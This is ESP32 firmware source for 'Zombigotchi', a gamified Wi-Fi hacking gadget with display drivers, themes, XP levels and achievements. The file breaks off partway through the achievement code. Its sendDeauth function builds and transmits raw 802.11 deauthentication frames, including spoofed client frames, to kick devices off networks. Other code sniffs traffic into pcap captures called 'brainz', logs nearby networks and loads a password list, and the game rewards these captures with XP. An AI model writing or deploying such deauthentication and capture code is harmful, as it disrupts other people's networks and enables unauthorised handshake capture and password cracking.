/*
 * ZOMBIGOTCHI - ESP32 CYD (Cheap Yellow Display)
 *
 * SD LIBRARY NOTE: In Arduino IDE, go to Tools -> Manage Libraries
 * and UNINSTALL any "SD" library by Arduino/SparkFun.
 * Use ONLY the built-in SD that comes with the ESP32 board package.
 */

#include <SPI.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>
#include <Preferences.h>

// ── PINS ────────────────────────────────────────────
#define PIN_MISO  12
#define PIN_MOSI  13
#define PIN_SCLK  14
#define PIN_TFT_CS 15
#define PIN_DC     2
#define PIN_BL    21
#define PIN_TOUCH 33
#define PIN_SD     5
#define PIN_BTN    0   // boot button, LOW = pressed

// ── SCREEN ──────────────────────────────────────────
#define SW 320
#define SH 240

// ILI9341 commands
#define CMD_RESET  0x01
#define CMD_SLPOUT 0x11
#define CMD_DISPON 0x29
#define CMD_CASET  0x2A
#define CMD_PASET  0x2B
#define CMD_RAMWR  0x2C
#define CMD_MADCTL 0x36
#define CMD_COLMOD 0x3A

// RGB565 palette
#define C_BLACK   0x0000
#define C_WHITE   0xFFFF
#define C_GREEN   0x07E0
#define C_DKGRN   0x03E0
#define C_RED     0xF800
#define C_DKRED   0x7800
#define C_BLUE    0x001F
#define C_DKBLU   0x000F
#define C_CYAN    0x07FF
#define C_DKCYN   0x03EF
#define C_YELL    0xFFE0
#define C_DKYEL   0x8400
#define C_ORNG    0xFD20
#define C_DKORG   0x7A00
#define C_PURP    0x780F
#define C_DKPUR   0x3807

// Active theme colours
uint16_t BG, FG, DIM;

// ── SPI HELPERS ─────────────────────────────────────
void tft_cmd(uint8_t c) {
  digitalWrite(PIN_DC, LOW);
  digitalWrite(PIN_TFT_CS, LOW);
  SPI.transfer(c);
  digitalWrite(PIN_TFT_CS, HIGH);
}
void tft_dat(uint8_t d) {
  digitalWrite(PIN_DC, HIGH);
  digitalWrite(PIN_TFT_CS, LOW);
  SPI.transfer(d);
  digitalWrite(PIN_TFT_CS, HIGH);
}
void tft_init() {
  pinMode(PIN_TFT_CS, OUTPUT); digitalWrite(PIN_TFT_CS, HIGH);
  pinMode(PIN_DC,     OUTPUT);
  pinMode(PIN_BL,     OUTPUT); digitalWrite(PIN_BL, HIGH);
  SPI.begin(PIN_SCLK, PIN_MISO, PIN_MOSI);
  SPI.setFrequency(40000000);
  tft_cmd(CMD_RESET);  delay(120);
  tft_cmd(CMD_SLPOUT); delay(120);
  tft_cmd(CMD_COLMOD); tft_dat(0x55);
  tft_cmd(CMD_MADCTL); tft_dat(0x28);
  tft_cmd(CMD_DISPON);
}
void setWin(int16_t x0,int16_t y0,int16_t x1,int16_t y1) {
  tft_cmd(CMD_CASET); tft_dat(x0>>8); tft_dat(x0); tft_dat(x1>>8); tft_dat(x1);
  tft_cmd(CMD_PASET); tft_dat(y0>>8); tft_dat(y0); tft_dat(y1>>8); tft_dat(y1);
  tft_cmd(CMD_RAMWR);
}
void fillRect(int16_t x,int16_t y,int16_t w,int16_t h,uint16_t c) {
  if (w<=0||h<=0) return;
  setWin(x,y,x+w-1,y+h-1);
  digitalWrite(PIN_DC, HIGH);
  digitalWrite(PIN_TFT_CS, LOW);
  uint8_t hi=c>>8, lo=c;
  for (int32_t n=w*h; n>0; n--) { SPI.transfer(hi); SPI.transfer(lo); }
  digitalWrite(PIN_TFT_CS, HIGH);
}
void cls(uint16_t c) { fillRect(0,0,SW,SH,c); }

// ── FONT ────────────────────────────────────────────
static const uint8_t F5x7[][5] PROGMEM = {
  {0x00,0x00,0x00,0x00,0x00},{0x00,0x00,0x5F,0x00,0x00},{0x00,0x07,0x00,0x07,0x00},
  {0x14,0x7F,0x14,0x7F,0x14},{0x24,0x2A,0x7F,0x2A,0x12},{0x23,0x13,0x08,0x64,0x62},
  {0x36,0x49,0x55,0x22,0x50},{0x00,0x05,0x03,0x00,0x00},{0x00,0x1C,0x22,0x41,0x00},
  {0x00,0x41,0x22,0x1C,0x00},{0x0A,0x04,0x1F,0x04,0x0A},{0x08,0x08,0x3E,0x08,0x08},
  {0x00,0x50,0x30,0x00,0x00},{0x08,0x08,0x08,0x08,0x08},{0x00,0x60,0x60,0x00,0x00},
  {0x20,0x10,0x08,0x04,0x02},{0x3E,0x51,0x49,0x45,0x3E},{0x00,0x42,0x7F,0x40,0x00},
  {0x42,0x61,0x51,0x49,0x46},{0x21,0x41,0x45,0x4B,0x31},{0x18,0x14,0x12,0x7F,0x10},
  {0x27,0x45,0x45,0x45,0x39},{0x3C,0x4A,0x49,0x49,0x30},{0x01,0x71,0x09,0x05,0x03},
  {0x36,0x49,0x49,0x49,0x36},{0x06,0x49,0x49,0x29,0x1E},{0x00,0x36,0x36,0x00,0x00},
  {0x00,0x56,0x36,0x00,0x00},{0x08,0x14,0x22,0x41,0x00},{0x14,0x14,0x14,0x14,0x14},
  {0x00,0x41,0x22,0x14,0x08},{0x02,0x01,0x51,0x09,0x06},{0x32,0x49,0x79,0x41,0x3E},
  {0x7E,0x11,0x11,0x11,0x7E},{0x7F,0x49,0x49,0x49,0x36},{0x3E,0x41,0x41,0x41,0x22},
  {0x7F,0x41,0x41,0x22,0x1C},{0x7F,0x49,0x49,0x49,0x41},{0x7F,0x09,0x09,0x09,0x01},
  {0x3E,0x41,0x49,0x49,0x7A},{0x7F,0x08,0x08,0x08,0x7F},{0x00,0x41,0x7F,0x41,0x00},
  {0x20,0x40,0x41,0x3F,0x01},{0x7F,0x08,0x14,0x22,0x41},{0x7F,0x40,0x40,0x40,0x40},
  {0x7F,0x02,0x0C,0x02,0x7F},{0x7F,0x04,0x08,0x10,0x7F},{0x3E,0x41,0x41,0x41,0x3E},
  {0x7F,0x09,0x09,0x09,0x06},{0x3E,0x41,0x51,0x21,0x5E},{0x7F,0x09,0x19,0x29,0x46},
  {0x46,0x49,0x49,0x49,0x31},{0x01,0x01,0x7F,0x01,0x01},{0x3F,0x40,0x40,0x40,0x3F},
  {0x1F,0x20,0x40,0x20,0x1F},{0x3F,0x40,0x38,0x40,0x3F},{0x63,0x14,0x08,0x14,0x63},
  {0x07,0x08,0x70,0x08,0x07},{0x61,0x51,0x49,0x45,0x43},{0x00,0x7F,0x41,0x41,0x00},
  {0x02,0x04,0x08,0x10,0x20},{0x00,0x41,0x41,0x7F,0x00},{0x04,0x02,0x01,0x02,0x04},
  {0x40,0x40,0x40,0x40,0x40},{0x00,0x01,0x02,0x04,0x00},{0x20,0x54,0x54,0x54,0x78},
  {0x7F,0x48,0x44,0x44,0x38},{0x38,0x44,0x44,0x44,0x20},{0x38,0x44,0x44,0x48,0x7F},
  {0x38,0x54,0x54,0x54,0x18},{0x08,0x7E,0x09,0x01,0x02},{0x0C,0x52,0x52,0x52,0x3E},
  {0x7F,0x08,0x04,0x04,0x78},{0x00,0x44,0x7D,0x40,0x00},{0x20,0x40,0x44,0x3D,0x00},
  {0x7F,0x10,0x28,0x44,0x00},{0x00,0x41,0x7F,0x40,0x00},{0x7C,0x04,0x18,0x04,0x78},
  {0x7C,0x08,0x04,0x04,0x78},{0x38,0x44,0x44,0x44,0x38},{0x7C,0x14,0x14,0x14,0x08},
  {0x08,0x14,0x14,0x18,0x7C},{0x7C,0x08,0x04,0x04,0x08},{0x48,0x54,0x54,0x54,0x20},
  {0x04,0x3F,0x44,0x40,0x20},{0x3C,0x40,0x40,0x20,0x7C},{0x1C,0x20,0x40,0x20,0x1C},
  {0x3C,0x40,0x30,0x40,0x3C},{0x44,0x28,0x10,0x28,0x44},{0x0C,0x50,0x50,0x50,0x3C},
  {0x44,0x64,0x54,0x4C,0x44},
};
void glyph(int16_t x,int16_t y,char c,uint16_t fg,uint16_t bg,uint8_t s) {
  if (c<' '||c>'z') c=' ';
  const uint8_t* g=F5x7[c-' '];
  for (int col=0;col<5;col++) {
    uint8_t bits=pgm_read_byte(&g[col]);
    for (int row=0;row<7;row++)
      fillRect(x+col*s, y+row*s, s, s, (bits>>row)&1 ? fg : bg);
  }
  fillRect(x+5*s, y, s, 7*s, bg);
}
void txt(int16_t x,int16_t y,const char* s,uint16_t fg,uint16_t bg,uint8_t sz) {
  while (*s) { glyph(x,y,*s++,fg,bg,sz); x+=6*sz; }
}
void txti(int16_t x,int16_t y,int32_t v,uint16_t fg,uint16_t bg,uint8_t sz) {
  char b[12]; sprintf(b,"%ld",v); txt(x,y,b,fg,bg,sz);
}
void xpbar(int16_t x,int16_t y,int16_t w,int16_t h,uint32_t cur,uint32_t tot) {
  fillRect(x,y,w,h,FG); fillRect(x+1,y+1,w-2,h-2,BG);
  if (tot>0) { int fw=(int)((float)cur/tot*(w-2)); if(fw>0) fillRect(x+1,y+1,fw,h-2,FG); }
}

// ── TOUCH (XPT2046) ─────────────────────────────────
// Raw read – does NOT change SPI frequency.
// Caller must set SPI.setFrequency(1000000) before and 40000000 after.
static uint16_t xpt_raw(uint8_t cmd) {
  digitalWrite(PIN_TFT_CS, HIGH); // ensure display deselected
  digitalWrite(PIN_TOUCH,  LOW);
  SPI.transfer(cmd);
  delayMicroseconds(200);
  uint16_t v = ((uint16_t)SPI.transfer(0)<<8 | SPI.transfer(0)) >> 3;
  digitalWrite(PIN_TOUCH, HIGH);
  return v;
}

// Returns true if touched. tx/ty = screen coords.
bool touch_get(int16_t &tx, int16_t &ty) {
  SPI.setFrequency(1000000);
  uint16_t z1 = xpt_raw(0xB0);
  uint16_t z2 = xpt_raw(0xC0);
  int32_t  p  = (int32_t)z1 + 4095 - (int32_t)z2;
  if (p < 400) { SPI.setFrequency(40000000); return false; }
  uint32_t rx=0, ry=0;
  for (int i=0;i<8;i++) { rx+=xpt_raw(0xD0); ry+=xpt_raw(0x90); }
  SPI.setFrequency(40000000);
  tx = constrain((int16_t)map(ry/8, 300,3800, 0,SW-1), 0,SW-1);
  ty = constrain((int16_t)map(rx/8, 200,3900, 0,SH-1), 0,SH-1);
  return true;
}

// Block until touch AND button are both released (with hard 1.5s timeout each)
// Prevents the button-still-held-on-entry freeze.
void inputs_clear() {
  // Wait for button to be released (max 1.5s) before entering any screen.
  uint32_t t = millis();
  while (digitalRead(PIN_BTN)==LOW && millis()-t < 1500) delay(10);
  delay(50);
}

// ── THEMES ──────────────────────────────────────────
struct Theme { const char* name; uint16_t bg,fg,dim; };
const Theme THEMES[] = {
  {"GREEN", C_BLACK,C_GREEN,C_DKGRN},{"RED",  C_BLACK,C_RED,  C_DKRED},
  {"BLUE",  C_BLACK,C_BLUE, C_DKBLU},{"CYAN", C_BLACK,C_CYAN, C_DKCYN},
  {"YELLOW",C_BLACK,C_YELL, C_DKYEL},{"ORANGE",C_BLACK,C_ORNG,C_DKORG},
  {"PURPLE",C_BLACK,C_PURP, C_DKPUR},{"WHITE",C_BLACK,C_WHITE,0x8410 },
  {"INVERT",C_WHITE,C_BLACK,0x7BEF },
};
#define NTHEMES 9
uint8_t themeIdx=0;
void applyTheme(uint8_t i) {
  if(i>=NTHEMES)i=0; themeIdx=i; BG=THEMES[i].bg; FG=THEMES[i].fg; DIM=THEMES[i].dim;
}

// ── FACES ───────────────────────────────────────────
const char* FL[]={ // Lurk
  "(x_x)","(=_=)","(e_e)","(@_@)","(._.)","[x_x]","(X_x)","(x_X)",
  "(o_x)","(x_o)","(._.)","{x_x}","(X_#)","[=_=]","|x_x|","(x_@)",
  "[@_@]","(X_X)",">x_x<","(X_-)","(-_X)","{=_=}","|=_=|","(;_;)",
};
const char* FH[]={ // Hunt
  "(O_O)","(o_O)","(>_<)","(O_o)","{O_O}","(0_0)","(O_0)","(0_O)",
  "(@_O)","(O_@)","(o_0)","(>_O)",">O_O<","{>_<}","[O_O]","(D_D)",
  "(E_E)","(O_#)","[0_0]","{O_0}","|O_O|","(#_O)",">0_0<","(o_O)",
};
const char* FF[]={ // Feast
  "(^_^)","(X_X)","(#_#)","(*_*)","(B_B)","(~_~)","(^_#)","(*_^)",
  "(~_*)","(B_^)","(#_^)","(@_^)",">^_^<","(^_B)","{*_*}","[^_^]",
  "(X_^)","(#_B)","[*_*]","{^_^}","|*_*|","(B_*)", "(^_X)",">*_*<",
};
const char* FSHAMBLE[]={ // Shamble
  "(-_-)","(u_u)","(z_z)","(._o)","(+_+)","(v_v)","(-_o)","(o_-)",
  "(z_u)","(u_z)","(._-)","(-_.)", "[-_-]","{u_u}","|z_z|","[+_+]",
  "{-_-}","|u_u|",">-_-<","(z_-)","(-_z)","(u_+)","(+_u)",">z_z<",
};
const char** FPOOLS[]={FL,FH,FF,FSHAMBLE};
#define NFACES 24
#define MOOD_LURK    0
#define MOOD_HUNT    1
#define MOOD_FEAST   2
#define MOOD_SHAMBLE 3
const char* MNAMES[]={"Lurking  ","Hunting  ","Feasting!","Shambling"};

uint8_t mood=0, faceIdx=0;
unsigned long lastFace=0;
const char* curFace() { return FPOOLS[mood][faceIdx%NFACES]; }

// ── XP / LEVEL ──────────────────────────────────────
#define MAXLVL 55
const char* TITLES[]={
  "",
  "Freshly Dead", "Shambler    ", "Groaner     ", "Crawler     ", // 1-4
  "Walker      ", "Runner      ", "Infected    ", "Feral       ", // 5-8
  "Ravager     ", "Brain Eater ", "Necromancer ", "Undead Lord ", // 9-12
  "Lich        ", "Revenant    ", "Ghoul       ", "Wraith      ", // 13-16
  "Specter     ", "Phantom     ", "Banshee     ", "Death Knight", // 17-20
  "Plague Lord ", "Bone Tyrant ", "Soul Reaper ", "Crypt Walker", // 21-24
  "Void Stalker", "Hex Warden  ", "Dark Shaman ", "Blood Witch ", // 25-28
  "Grave Titan ", "Doom Bringer", "Ash Walker  ", "Rot Champion", // 29-32
  "Infernal One", "Chaos Fiend ", "Abyss Spawn ", "Hellion     ", // 33-36
  "Dreadlord   ", "Warlord Lich", "Undying King", "Eternal One ", // 37-40
  "Apocalypse  ", "Extinction  ", "Oblivion    ", "Annihilator ", // 41-44
  "Worldbreaker", "Voidwalker  ", "Armageddon  ", "Ragnarok    ", // 45-48
  "CATACLYSM   ", "SINGULARITY ", "TRANSCENDENCE","OMNICIDE    ", // 49-52
  "THE END     ", "BEYOND DEATH", "Z O M B I E ", // 53-55
};

uint32_t xp=0, xpNext=500; uint8_t lvl=1; bool lvlPending=false;

// XP curve: starts easy, gets progressively harder
// Base formula: 500 + (level^2 * 150) — ramps from 500 at lv1 to ~457k at lv55
uint32_t xpForLvl(uint8_t l){
  return 500 + (uint32_t)l * (uint32_t)l * 150;
}

void gainXP(uint32_t a){
  if(lvlPending)return; xp+=a;
  if(xp>=xpNext&&lvl<MAXLVL){xp=0;lvl++;xpNext=xpForLvl(lvl);lvlPending=true;}
}

// Streak
#define STREAK_TIMEOUT 60000
uint32_t streak=0; unsigned long lastBrainzT=0; float xpMult=1.0f;
void hitStreak(){
  unsigned long now=millis();
  if(lastBrainzT>0&&now-lastBrainzT>STREAK_TIMEOUT){streak=0;xpMult=1.0f;}
  streak++; lastBrainzT=now;
  xpMult=streak>=10?3.0f:streak>=5?2.0f:streak>=3?1.5f:1.0f;
}

// ── STATS ────────────────────────────────────────────
uint32_t brainz=0,packets=0,apsFound=0;
uint32_t sBrainz=0,ltBrainz=0,ltSessions=0,ltPackets=0,ltAPs=0,bestBrainz=0;
unsigned long uptime=0;

// ── NETWORKS ─────────────────────────────────────────
#define MAXNETS 50
struct Net{uint8_t bssid[6];char ssid[33];uint8_t ch;};
Net nets[MAXNETS]; int nNets=0;
bool chSeen[14]={};

// ── DEAUTH ───────────────────────────────────────────
bool     deauth=false; uint32_t deauthCnt=0; uint8_t deauthIdx=0;
unsigned long lastDeauth=0;
uint8_t  ch=1; unsigned long lastHop=0;
void sendDeauth(uint8_t* bssid, uint8_t c){
  // Temporarily hop to target channel
  esp_wifi_set_channel(c, WIFI_SECOND_CHAN_NONE);
  delayMicroseconds(200);

  // Deauth frame: 24-byte header + 2-byte reason
  uint8_t frm[26];
  memset(frm, 0, sizeof(frm));
  frm[0] = 0xC0; frm[1] = 0x00; // type=mgmt subtype=deauth
  frm[2] = 0x00; frm[3] = 0x00; // duration

  // Send 1: AP → broadcast  (boots all associated clients)
  memset(frm+4,  0xFF, 6);       // DA = broadcast
  memcpy(frm+10, bssid, 6);      // SA = AP
  memcpy(frm+16, bssid, 6);      // BSSID = AP
  frm[22]=0x00; frm[23]=0x00;    // seq/frag = 0
  frm[24]=0x07; frm[25]=0x00;    // reason = class3 frame from unassoc STA
  for(int i=0;i<3;i++){
    esp_wifi_80211_tx(WIFI_IF_STA, frm, 26, false);
    delayMicroseconds(300);
  }

  // Send 2: Fake client → AP  (tells AP the client is leaving, triggers re-auth)
  // Use a plausible fake client MAC derived from BSSID
  uint8_t fakeCli[6]; memcpy(fakeCli, bssid, 6); fakeCli[0]=(fakeCli[0]&0xFE)|0x02;
  memcpy(frm+4,  bssid,   6);    // DA = AP
  memcpy(frm+10, fakeCli, 6);    // SA = fake client
  memcpy(frm+16, bssid,   6);    // BSSID = AP
  frm[24]=0x08; frm[25]=0x00;    // reason = deauth leaving
  for(int i=0;i<3;i++){
    esp_wifi_80211_tx(WIFI_IF_STA, frm, 26, false);
    delayMicroseconds(300);
  }

  // Hop back to scanning channel
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  deauthCnt++;
}

// ── SD / PCAP ─────────────────────────────────────────
bool sdOK=false; uint32_t sessNum=0;
File pcap; bool pcapOpen=false; char pcapPath[48];
volatile bool pendSave=false, pendPcap=false;
uint8_t pcapBuf[2048]; uint16_t pcapLen=0;

void pcapHdr(File&f){
  uint32_t m=0xa1b2c3d4; uint16_t mj=2,mn=4,tz=0,sg=0; uint32_t sl=65535,nw=105;
  f.write((uint8_t*)&m,4);f.write((uint8_t*)&mj,2);f.write((uint8_t*)&mn,2);
  f.write((uint8_t*)&tz,4);f.write((uint8_t*)&sg,4);f.write((uint8_t*)&sl,4);f.write((uint8_t*)&nw,4);
}
void pcapPkt(File&f,uint32_t ts,uint16_t len){
  uint32_t us=0,il=len,ol=len;
  f.write((uint8_t*)&ts,4);f.write((uint8_t*)&us,4);f.write((uint8_t*)&il,4);f.write((uint8_t*)&ol,4);
}
void openPcap(){
  snprintf(pcapPath,48,"/zbg/brainz/s%04u.pcap",(unsigned)sessNum);
  SPI.setFrequency(4000000);
  if(!SD.exists("/zbg/brainz")) SD.mkdir("/zbg/brainz");
  pcap=SD.open(pcapPath,FILE_WRITE);
  if(pcap){pcapHdr(pcap);pcap.flush();pcapOpen=true;}
  SPI.setFrequency(40000000);
}
void writePcap(uint8_t*buf,uint16_t len){
  if(!sdOK)return; if(!pcapOpen)openPcap(); if(!pcapOpen)return;
  SPI.setFrequency(4000000);
  pcapPkt(pcap,(uint32_t)(millis()/1000),len);
  pcap.write(buf,len); pcap.flush();
  SPI.setFrequency(40000000);
}

// Append a newly found network to the CSV log
void logNetCSV(int idx){
  if(!sdOK) return;
  SPI.setFrequency(4000000);
  if(!SD.exists("/zbg/nets")) SD.mkdir("/zbg/nets");
  char path[48]; snprintf(path,48,"/zbg/nets/nets_%04u.csv",(unsigned)sessNum);
  bool newFile=!SD.exists(path);
  File f=SD.open(path, FILE_APPEND);
  if(f){
    if(newFile) f.println("session,idx,ssid,bssid,channel");
    char mac[18];
    uint8_t*b=nets[idx].bssid;
    snprintf(mac,18,"%02X:%02X:%02X:%02X:%02X:%02X",b[0],b[1],b[2],b[3],b[4],b[5]);
    char line[96];
    snprintf(line,96,"%u,%d,\"%s\",%s,%d",(unsigned)sessNum,idx,nets[idx].ssid,mac,nets[idx].ch);
    f.println(line); f.flush(); f.close();
  }
  SPI.setFrequency(40000000);
}

// Write session summary to SD (called on each save)
void writeSessionStats(){
  if(!sdOK) return;
  SPI.setFrequency(4000000);
  if(!SD.exists("/zbg/stats")) SD.mkdir("/zbg/stats");
  char path[48]; snprintf(path,48,"/zbg/stats/session_%04u.txt",(unsigned)sessNum);
  File f=SD.open(path, FILE_WRITE); // overwrite with latest
  if(f){
    char line[64];
    f.println("=== ZOMBIGOTCHI SESSION STATS ===");
    snprintf(line,64,"session:        %u",(unsigned)sessNum);      f.println(line);
    snprintf(line,64,"level:          %d  (%s)",lvl,TITLES[lvl<=MAXLVL?lvl:MAXLVL]); f.println(line);
    snprintf(line,64,"session brainz: %u",(unsigned)sBrainz);      f.println(line);
    snprintf(line,64,"lifetime brainz:%u",(unsigned)ltBrainz);     f.println(line);
    snprintf(line,64,"best session:   %u",(unsigned)bestBrainz);   f.println(line);
    snprintf(line,64,"packets sniffed:%u",(unsigned)ltPackets);    f.println(line);
    snprintf(line,64,"networks found: %u",(unsigned)nNets);        f.println(line);
    snprintf(line,64,"uptime (sec):   %lu",uptime);                f.println(line);
    snprintf(line,64,"xp:             %u/%u",(unsigned)xp,(unsigned)xpNext); f.println(line);
    snprintf(line,64,"streak:         %u  (x%.1f)",(unsigned)streak,xpMult); f.println(line);
    f.println("--- networks this session ---");
    for(int i=0;i<nNets;i++){
      uint8_t*b=nets[i].bssid;
      snprintf(line,64,"  ch%02d  %02X:%02X:%02X:%02X:%02X:%02X  %s",
        nets[i].ch,b[0],b[1],b[2],b[3],b[4],b[5],nets[i].ssid);
      f.println(line);
    }
    f.flush(); f.close();
  }
  SPI.setFrequency(40000000);
}

void initSD(){
  SPI.end(); delay(20);
  SPI.begin(PIN_SCLK,PIN_MISO,PIN_MOSI,PIN_SD); SPI.setFrequency(4000000);
  sdOK=SD.begin(PIN_SD);
  if(sdOK){
    // Ensure directory structure exists
    if(!SD.exists("/zbg"))           SD.mkdir("/zbg");
    if(!SD.exists("/zbg/brainz"))    SD.mkdir("/zbg/brainz");
    if(!SD.exists("/zbg/nets"))      SD.mkdir("/zbg/nets");
    if(!SD.exists("/zbg/stats"))     SD.mkdir("/zbg/stats");
  }
  SPI.end(); delay(20);
  SPI.begin(PIN_SCLK,PIN_MISO,PIN_MOSI,PIN_TFT_CS); SPI.setFrequency(40000000);
}

// ── PASSWORDS ────────────────────────────────────────
#define MAXPW 20
char pws[MAXPW][48]; uint8_t nPW=0,pwIdx=0; bool pwLoaded=false;
unsigned long lastPwFlip=0;
void loadPasswords(){
  if(!sdOK)return;
  SPI.setFrequency(4000000);
  File f=SD.open("/zbg/passwords.txt");
  if(!f){SPI.setFrequency(40000000);return;}
  nPW=0;
  while(f.available()&&nPW<MAXPW){
    String l=f.readStringUntil('\n');l.trim();
    if(l.length()>0){strncpy(pws[nPW],l.c_str(),47);pws[nPW][47]=0;nPW++;}
  }
  f.close(); SPI.setFrequency(40000000); pwLoaded=(nPW>0);
}

// ── ACHIEVEMENTS ─────────────────────────────────────
#define NACH 27
struct Ach{const char*id,*title,*desc,*reward;bool got;};
Ach ACHS[NACH]={
  {"b1",  "First Blood",      "Capture first brainz",      "+500 XP",        false},
  {"b5",  "Feeding Frenzy",   "Capture 5 brainz",          "Streak x2",      false},
  {"b10", "Brain Collector",  "Capture 10 brainz",         "+1000 XP",       false},
  {"b25", "Horde Mind",       "Capture 25 brainz",         "Mood boost",     false},
  {"b50", "Nom Nom Nom",       "Capture 50 brainz",        "+5000 XP",       false},
  {"b100","The Hunger",        "100 lifetime brainz",      "Legendary",      false},
  {"l5",  "Rising Dead",      "Reach level 5",             "New faces",      false},
  {"l10", "Apex Predator",    "Reach level 10",            "Brain Eater",    false},
  {"l25", "Half Damned",      "Reach level 25",            "Void Stalker",   false},
  {"l40", "Eternal Curse",    "Reach level 40",            "Undying King",   false},
  {"l55", "Z O M B I E",     "Reach max level 55",        "You transcend",  false},
  {"n10", "Neighbourhood Watch","Find 10 networks",        "AP radar",       false},
  {"n50", "City Scanner",     "Find 50 networks",          "+2x AP XP",      false},
  {"n100","The Surveyor",     "100 networks total",        "Ghost of WiFi",  false},
  {"s3",  "On A Roll",        "3x brainz streak",          "x1.5 XP",        false},
  {"s5",  "Unstoppable",      "5x brainz streak",          "x2.0 XP",        false},
  {"s10", "RAMPAGE",           "10x brainz streak",        "x3.0 XP",        false},
  {"ss1", "Night Stalker",    "Active 30 minutes",         "Uptime badge",   false},
  {"ss2", "Sleepless Dead",   "Active 2 hours",            "Insomniac",      false},
  {"ss3", "Marathon Zombie",  "Active 8 hours",            "Legendary",      false},
  {"p1k", "Eavesdropper",     "Sniff 1000 packets",        "Passive master", false},
  {"p10k","Deep Listener",    "Sniff 10000 packets",       "+1000 XP",       false},
  {"sec1","Insomniac",        "Run 24 hours straight",     "Get help",       false},
  {"sec2","Glutton",          "3 brainz in one session",   "Greedy zombie",  false},
  {"sec3","Speed Demon",      "2 brainz within 10 seconds","x2 XP 5min",    false},
  {"sec4","Explorer",         "Scan all 13 channels",      "Full spectrum",  false},
  {"sec5","Dedicated",        "Complete 10 sessions",      "Veteran zombie", false},
};
uint8_t achQ[5],achQH=0,achQT=0;
int achId(const char*s){for(int i=0;i<NACH;i++)if(!strcmp(ACHS[i].id,s))return i;return -1;}

// ── COSMETICS ────────────────────────────────────────
struct Bdr{const char*name,*lock;uint8_t s;};
struct Acc{const char*name,*lock,*top,*side;};
struct Bdg{const char*name,*icon,*lock;};
struct Flr{const char*name,*pre,*suf,*lock;};

const Bdr BDRS[]={
  {"NONE",NULL,0},{"CLASSIC","b1",1},{"DOUBLE","l5",2},
  {"SKULL","b25",3},{"GLITCH","s5",4},{"CROWN","l55",5},
};
const Acc ACCS[]={
  {"NONE",NULL,"",""},    {"HAT","n10"," ^^^^ ",""},
  {"HALO","ss1","  *o*  ",""}, {"CROWN","l10"," >-<>-",""},
  {"DRIP","b10","","~"},  {"SCAR","s3","","/"},
  {"GHOST","ss2"," -~~~- ",""},{"DEVIL","b50"," /v\\ ",""},
};
const Bdg BDGS[]={
  {"SKULL","[x]","b1"},{"FIRE","vAv","b5"},{"BRAIN","(#)","b10"},
  {"HORDE","###","b25"},{"LEGEND","***","b100"},{"SPECTER","~o~","ss1"},
  {"GHOST","- -","ss2"},{"ETERNAL","oOo","ss3"},{"RAMPAGE",">!<","s10"},
  {"SCANNER","[-]","n50"},{"MAXED","^X^","l55"},{"VETERAN","|V|","sec5"},
};
const Flr FLRS[]={
  {"PLAIN","","",NULL},{"STAR","*","*","b5"},{"SKULL","X","X","b25"},
  {"CROWN","^","^","l10"},{"FIRE",">","<","s5"},{"LEGEND",">>","<<","b100"},
};
#define NBD 6
#define NAC 8
#define NBG 12
#define NFL 6
#define MXBDG 4

uint8_t eBdr=0,eAcc=0,eFlr=0,eBdg[MXBDG]={255,255,255,255};

bool cunlock(const char*id){if(!id)return true;int i=achId(id);return i>=0&&ACHS[i].got;}

// ── NVS ──────────────────────────────────────────────
Preferences P;
void saveAll(){
  P.begin("zbg",false);
  P.putUInt("lv",lvl); P.putUInt("xp",xp); P.putUInt("br",brainz);
  P.putUInt("sn",sessNum); P.putUInt("th",themeIdx);
  P.putUInt("lb",ltBrainz); P.putUInt("ls",ltSessions);
  P.putUInt("lp",ltPackets); P.putUInt("la",ltAPs); P.putUInt("bb",bestBrainz);
  uint32_t bits=0; for(int i=0;i<NACH;i++) if(ACHS[i].got) bits|=(1UL<<i);
  P.putUInt("ac",bits);
  P.putUChar("bd",eBdr); P.putUChar("ac2",eAcc); P.putUChar("fl",eFlr);
  P.putUChar("b0",eBdg[0]); P.putUChar("b1",eBdg[1]);
  P.putUChar("b2",eBdg[2]); P.putUChar("b3",eBdg[3]);
  P.end();
}
void loadAll(){
  P.begin("zbg",true);
  lvl=P.getUInt("lv",1); xp=P.getUInt("xp",0); brainz=P.getUInt("br",0);
  sessNum=P.getUInt("sn",0)+1; themeIdx=P.getUInt("th",0);
  ltBrainz=P.getUInt("lb",0); ltSessions=P.getUInt("ls",0)+1;
  ltPackets=P.getUInt("lp",0); ltAPs=P.getUInt("la",0); bestBrainz=P.getUInt("bb",0);
  uint32_t bits=P.getUInt("ac",0); for(int i=0;i<NACH;i++) ACHS[i].got=(bits>>i)&1;
  eBdr=P.getUChar("bd",0); eAcc=P.getUChar("ac2",0); eFlr=P.getUChar("fl",0);
  eBdg[0]=P.getUChar("b0",255); eBdg[1]=P.getUChar("b1",255);
  eBdg[2]=P.getUChar("b2",255); eBdg[3]=P.getUChar("b3",255);
  P.end();
  xpNext=xpForLvl(lvl); if(lvl<1)lvl=1; if(lvl>MAXLVL)lvl=MAXLVL;
  xpNext=xpForLvl(lvl); // recalc after clamp
  applyTheme(themeIdx);
}

// ── ACHIEVEMENT ENGINE ────────────────────────────────
void unlock(int i){
  if(i<0||i>=NACH||ACHS[i].got)return;
  ACHS[i].got=true;
  uint8_t nxt=(achQT+1)%5; if(nxt!=achQH){achQ[achQT]=i;achQT=nxt;}
  saveAll();
}
void checkAchs(){
  if(ltBrainz>=1)   unlock(achId("b1"));
  if(ltBrainz>=5)   unlock(achId("b5"));
  if(ltBrainz>=10)  unlock(achId("b10"));
  if(ltBrainz>=25)  unlock(achId("b25"));
  if(ltBrainz>=50)  unlock(achId("b50"));
  if(ltBrainz>=100) unlock(achId("b100"));
  if(lvl>=5)  unlock(achId("l5"));
  if(lvl>=10) unlock(achId("l10"));
  if(lvl>=25) unlock(achId("l25"));
  if(lvl>=40) unlock(achId("l40"));
  if(lvl>=55) unlock(achId("l55"));
  if(ltAPs>=10)  unlock(achId("n10"));
  if(ltAPs>=50)  unlock(achId("n50"));
  if(ltAPs>=100) unlock(achId("n100"));
  if(streak>=3)  unlock(achId("s3"));
  if(streak>=5)  unlock(achId("s5"));
  if(streak>=10) unlock(achId("s10"));
  if(uptime>=1800)  unlock(achId("ss1"));
  if(uptime>=7200)  unlock(achId("ss2"));
  if(uptime>=28800) unlock(achId("ss3"));
  if(uptime>=86400) unlock(achId("sec1"));
  if(ltPackets>=1000)  unlock(achId("p1k"));
  if(ltPackets>=10000) unlock(achId("p10k"));
  if(sBrainz>=3)     unlock(achId("sec2"));
  if(ltSessions>=10) unlock(achId("sec5"));
